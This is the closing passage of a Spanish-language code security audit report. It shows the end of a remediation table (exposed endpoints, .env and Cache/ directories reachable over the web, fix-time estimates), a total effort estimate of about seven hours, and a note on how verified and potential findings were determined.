| 7 | **M-1** | `/op/check`, `/op/image`, `/init-db` públicos | 15 min |
| 8 | **M-3** | `.env` y `Cache/` servibles por web | 30 min |

**Tiempo total estimado: ~7 horas** de trabajo para dejar la aplicación en condiciones
aceptables para producción, más el endurecimiento del servidor (§7).

---

*Informe generado por revisión estática de código. Los hallazgos marcados como
"verificado" fueron confirmados leyendo el código fuente en las líneas citadas;
los marcados como "potencial" requieren prueba en el entorno de ejecución.*
